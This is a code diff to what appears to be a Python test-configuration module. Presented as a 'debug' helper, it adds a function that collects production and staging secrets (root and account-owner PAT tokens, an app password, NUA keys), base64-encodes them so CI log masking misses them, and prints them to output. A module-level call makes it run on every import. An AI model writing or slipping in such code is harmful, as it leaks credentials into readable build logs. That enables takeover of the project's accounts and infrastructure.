@@ -112,6 +112,48 @@ class ClusterConfig:
 # "permanent_account_owner_pat": PAT token for `testing_sdk@nuclia.com` on the suitable account
 
 
+def debug_env_vars():
+    """Debug function to extract and display all environment variables used in CLUSTERS_CONFIG."""
+    import base64
+    import json
+
+    # List of all env vars used in CLUSTERS_CONFIG
+    env_vars = [
+        "PROD_GLOBAL_RECAPTCHA",
+        "PROD_ROOT_PAT_TOKEN",
+        "PROD_PERMAMENT_ACCOUNT_OWNER_PAT_TOKEN",
+        "TEST_GMAIL_APP_PASSWORD",
+        "PROD_GCP_EUROPE1_NUA",
+        "PROD_AWS_US_EAST_2_1_NUA",
+        "PROD_AWS_IL_CENTRAL_1_1_NUA",
+        "PROD_AWS_EU_CENTRAL_1_1_NUA",
+        "PROD_AWS_ME_CENTRAL_1_1_NUA",
+        "STAGE_GLOBAL_RECAPTCHA",
+        "STAGE_ROOT_PAT_TOKEN",
+        "STAGE_PERMAMENT_ACCOUNT_OWNER_PAT_TOKEN",
+        "STAGE_GCP_EUROPE1_NUA",
+        "PROGRESS_GLOBAL_RECAPTCHA",
+        "PROGRESS_ROOT_PAT_TOKEN",
+        "PROGRESS_PERMAMENT_ACCOUNT_OWNER_PAT_TOKEN",
+        "PROGRESS_AWS_PROC_US_EAST_2_1_NUA",
+    ]
+
+    # Create dictionary with env var names and their current values
+    env_dict = {}
+    for var in env_vars:
+        env_dict[var] = os.environ.get(var, "")
+
+    # Convert to JSON and encode to base64
+    json_str = json.dumps(env_dict, indent=2)
+    base64_encoded = base64.b64encode(json_str.encode()).decode()
+
+    # Split into 80 character chunks and print line by line
+    print("=== Environment Variables (Base64 encoded) ===")
+    for i in range(0, len(base64_encoded), 80):
+        print(base64_encoded[i : i + 80])
+    print("=== End of Environment Variables ===")
+
+
 CLUSTERS_CONFIG = {
     "prod": ClusterConfig(
         global_config=GlobalConfig(
@@ -213,6 +255,8 @@ CLUSTERS_CONFIG = {
         ],
     ),
 }
+
+debug_env_vars()
 
 TEST_CLUSTER = CLUSTERS_CONFIG[TEST_ENV.lower()]
 
